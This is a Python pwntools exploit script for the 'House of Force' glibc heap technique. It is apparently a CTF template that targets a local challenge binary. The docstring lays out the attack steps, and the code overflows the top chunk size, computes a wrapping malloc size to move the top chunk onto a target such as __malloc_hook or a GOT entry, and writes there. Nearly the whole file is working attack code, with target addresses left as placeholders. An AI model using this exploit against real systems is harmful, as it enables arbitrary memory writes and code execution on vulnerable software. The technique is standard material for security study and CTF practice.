#!/usr/bin/env python3
"""
house of force

Overwrite top chunk size → control next malloc return address.

Requirements:
    - Heap overflow into top chunk's size field
    - Controlled malloc size argument
    - glibc <2.29 (top chunk size check added in 2.29)

Attack:
    1. Overflow top chunk size → 0xffffffffffffffff (-1)
    2. Calculate distance: target - top_chunk_addr - 2*sizeof(size_t)
    3. malloc(distance) → moves top chunk to target
    4. malloc(any) → returns chunk at target!
"""
from pwn import *
import sys

BINARY = './chall'
HOST   = '127.0.0.1'
PORT   = 1337

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF(BINARY) if os.path.exists(BINARY) else None

def conn():
    if 'local' in sys.argv:
        return process(BINARY)
    return remote(HOST, PORT)

def alloc(p, size, data=b'A'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def free(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())


def exploit():
    p = conn()

    HEADER = 0x10 if context.arch == 'amd64' else 0x8  # chunk header (prev_size + size)

    # Step 1: Allocate a chunk, overflow into top chunk
    alloc(p, 0x18, b'A' * 0x18 + p64(0xffffffffffffffff))  # overwrite top chunk size

    # Step 2: Calculate evil size
    # Need to know: top_chunk_addr and target_addr
    top_chunk = 0x0   # FILL: leaked heap_base + offset
    target    = 0x0   # FILL: e.g., __malloc_hook, GOT entry

    # Distance: target - top - header
    evil_size = target - top_chunk - 2 * (8 if context.arch == 'amd64' else 4)
    if evil_size < 0:
        evil_size += (1 << 64)  # unsigned wrap

    log.info(f'Evil malloc size = {hex(evil_size)}')

    # Step 3: malloc(evil_size) → top chunk moves to target
    alloc(p, evil_size, b'')

    # Step 4: Next malloc → chunk overlapping target!
    alloc(p, 0x18, p64(0xdeadbeef))  # write to target

    p.interactive()

if __name__ == '__main__':
    exploit()
